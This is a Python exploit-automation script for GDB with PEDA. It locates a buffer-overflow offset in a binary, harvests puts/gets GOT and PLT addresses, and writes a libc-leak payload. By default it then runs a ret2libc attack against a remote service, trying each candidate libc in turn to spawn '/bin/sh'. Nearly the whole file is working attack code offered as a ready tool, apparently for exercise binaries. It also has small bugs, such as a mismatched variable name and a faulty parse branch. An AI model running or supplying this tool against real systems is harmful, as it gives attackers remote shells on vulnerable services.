## To run the script use the command 'ENVARNAME=ENVARVAL gdb *EXECUTABLENAME* -x ptestall.py' with both the executable and script in the same file path##

## If using the AUTO=True option the script getLeakRemoteBruteForce.py must be in the same directory as the script
print("""
To set the values for the program, you can use the following environment variables:

- PATTNUM (int): This tells the code how large of a pattern to create. Default: 400
- NOPNUM (int): This defines the number of nops used before the shellcode. Default: 10
- OFFOVER (int): This manually sets the buffer size.
- ARGV (bool): Tells the program if the buffer overflow input is stdin or argv, set to True if argv. Default: False
- ARCH (bool): Tells the program whether the executable is 64 or 32 bit, set to True if 32 bit. Default: True
- AUTO (bool): This tells the program whether it should automatically execute the ret2libc. Default: True
- PIPE (bool): This tells the program whether to pipe in the final payload. Default: False
- FLOWTYPE (str): This tells the program what the overflow payload should contain: select from FUNCJUMP, SHSHELL, R2LIBC. Default: FUNCJUMP
- OVERFUNC (str): This is the function where the buffer is overflowed. Default: main

""")

import os,sys,re

# String to boolean converter is a modified version of: https://stackoverflow.com/a/43357954
def str2bool(v, argname):
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        print("\nInvalid value for "+ argname+"\n", file=sys.stderr)
try:
	# Tells the code how large of a pattern to create
	pattnum = int(os.getenv('PATTNUM', 400))
except:
	print('\nPATTNUM must be an integer.\n', file=sys.stderr)

try:
	# Defines the number of nops used before the shellcode
	nopnum = int(os.getenv('NOPNUM', 10))
except:
	print('\nNOPNUM must be an integer.\n', file=sys.stderr)
try:
	# Defines the number of nops used before the shellcode
	offover = int(os.getenv('OFFOVER',-1))
except:
	print('\OFFOVER must be an integer.\n', file=sys.stderr)
# Tells the program if the buffer overflow input is stdin or argv, set to True if argv
argv = str2bool(os.getenv('ARGV', 'False'), 'ARGV')

# Tells the program whether the executable is 64 or 32 bit, set to True if 32 bit
arch = str2bool(os.getenv('ARCH', 'True'), 'ARCH')
if arch:
	byteNo = 4
else:
	byteNo = 8

# Tells the program whether it should automatically execute the ret2libc attack using getLeakRemoteBruteForce.py
auto = str2bool(os.getenv('AUTO', 'True'), 'AUTO')

# Tells the program whether to pipe in the final payload
pipe = str2bool(os.getenv('PIPE', 'False'), 'PIPE')

# The function where the buffer is overflowed
overfunc = os.getenv('OVERFUNC', 'main').lower()


# Save the output from first info functions to avoid the library functions that get added later
funcs = gdb.execute("info functions",True,True)

# This runs the 'pattern create' function in gdb peda and the output is written to the pattern.txt file
pattern_out=peda.execute_redirect("pattern create "+str(pattnum)+" pattern.txt")

# This runs the executable with the command line argument of the pattern we just created
# The command is altered depending on the input type specified above
if argv:
	command="run $(cat pattern.txt)"
else:
	command="run < pattern.txt"
disout=gdb.execute(command,True, True)


# This ANSI escape code removal code is found at: https://stackoverflow.com/a/14693789
def removeANSI(outp):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	return ansi_escape.sub('', outp)

if offover == -1:
	# This run the 'pattern search' function in gdb peda and the output is stored in the search_out variable
	search_out=gdb.execute("pattern search",True, True)
	print(search_out)
	searchlines = search_out.split("\n")
	offset = -1

	stackOff = -1
	# Use the pattern search output to find the amount of padding needed for the buffer overflow
	for line in searchlines:
		if "SP] --> offset " in line:
			if offset == -1:
				offset=int(removeANSI((line.split("SP] --> offset ")[1]).split(" -")[0].strip()))
				stackOff=int(removeANSI((line.split("SP] --> offset ")[1]).split(" -")[0].strip()))
			else:
				stackOff=int(removeANSI((line.split("SP] --> offset ")[1]).split(" -")[0].strip()))
		elif "SP+" in line:
			if offset == -1:
				offset=int(removeANSI((line.split("SP+")[1]).split("offset:")[1].strip()))
				stackOff=int(removeANSI((line.split("SP] --> offset ")[1]).split(" -")[0].strip()))
			else:
				stackOff=int(removeANSI((line.split("SP] --> offset ")[1]).split(" -")[0].strip()))
		elif "IP] --> offset " in line:
			offset=int(removeANSI((line.split("IP] --> offset ")[1]).split(" -")[0].strip()))
		elif "IP+" in line:
			offset=int(removeANSI((line.split("IP+")[1]).split("offset:")[1].strip()))
		if offset != -1 and stackOff != -1:
			break
	if offset == -1:
		# If the R/ESP or R/EIP is not found the overflow is not possible so the program is exited
		print("No overflow found")
		quit()	
	print("EIP Offset: "+str(offset))
else:
	# Allow the OFFOVER environment variable to override the eip offset
	offset = offover

# Get the exepath from gdb
exepath = gdb.execute("info proc exe",True,True)
exepath = exepath.split("exe = '")[1][:-2]

putsGot = 0
getsGot = 0
# Get the GOT output of the exe
objdumpOut = os.popen("objdump -R "+exepath).read()
for line in objdumpOut.split("\n"):
	if "puts@" in line:
		print("putsGOT Addr: "+line.split(" ")[0])
		putsGOT = line.split(" ")[0]
	if "gets@" in line:
		print("getsGOT Addr: "+line.split(" ")[0])
		getsGOT = line.split(" ")[0]
	if putsGot !=0 and getsGot !=0:
		break

putsPLT = 0
getsPLT = 0
# Find the puts and gets plt address by searching the output of 'info functions' executed at the start
for line in funcs.split("\n"):
	if "puts@" in line:
		putsPLT = removeANSI(line.split(" ")[0].strip())
		print("putsPLT Addr: "+putsPLT)
	if "gets@" in line:
		getsPLT = removeANSI(line.split(" ")[0].strip())
		print("getsPLT Addr: "+getsPLT)
	if putsPLT!=0 and getsPLT != 0:
		break

# Get the address of main
mainOut = gdb.execute("p "+overfunc,True,True)
mainAddr = mainOut.split(" <")[0].split(" ")[-1]

print(overfunc+" Addr: "+mainAddr)

# Convert string addresses to hex and write payload to file
f = open("leakPuts.txt","wb")
putsPLTHex = (int(putsPLT,16)).to_bytes(byteNo,'little')
mainHex = (int(mainAddr,16)).to_bytes(byteNo,'little')
putsGOTHex = (int(putsGOT,16)).to_bytes(byteNo,'little')
payload = b"A"*offset+putsPLTHex+mainHex+putsGOTHex
f.write(payload)
f.close()

# Write the function offsets and eip offset to file r2libcOffsets in json format
import json
print("")
f = open("r2libcOffsets.txt","w")
offsets = {"buffSize":offset,"putsPLT":putsPLT,"getsPLT":getsPLT,"mainAddr":mainAddr,"putsGot":putsGOT,"getsGot":getsGOT}
f.write(json.dumps(offsets)+"\n")
f.close()

# Automatically execute script getLeakRemoteBruteForce.py to execute the ret to libc on the live binary
if auto:
	# Set PWNLIB_NOTERM to avoid an error when importing pwntools
	sys.path.append(os.getcwd())
	os.environ["PWNLIB_NOTERM"]="1"
	import getLeakRemoteBruteForce as gl

	gl.buffSize = offset

	# Function offsets (these don't change due to PIE being disabled)
	gl.pltPuts = int(putsPLT,16)
	gl.mainAddr = int(mainAddr,16)
	gl.gotPuts = int(putsGOT,16)
	gl.arch = byteNo

	gotGets = int(getsGOT,16)

	# Leak both puts and gets' libc addresses for more accurate libc search
	putsAddr = gl.leakViaPuts(gl.remoteIp, gl.remotePort, gl.gotPuts)
	gl.proc.close()

	getsAddr = gl.leakViaPuts(gl.remoteIp, gl.remotePort, gotGets)
	gl.proc.close()

	responseJson = gl.findPotentialLibcs(putsAddr,getsAddr)

	# Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
	for item in responseJson:
		# Get the symbol offsets for the specific libc version
		putsOff, systemOff, exitOff, bin_shOff, mprotectOff, printfOff = gl.getLibcSymbolOffsets(item)
		# Attempt to execute system('/bin/sh')
		retVal = gl.attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))
		
		# Print exit message depending on the return value
		if retVal == 200:
			print("End of file recieved.")
			break
		else:
			gl.log.failure("Recieved premature EOF")
			gl.proc.close()
else:
	print("\nOffsets written to file r2libcOffsets.txt")
	print("Puts leak payload written to file leakPuts.txt\n")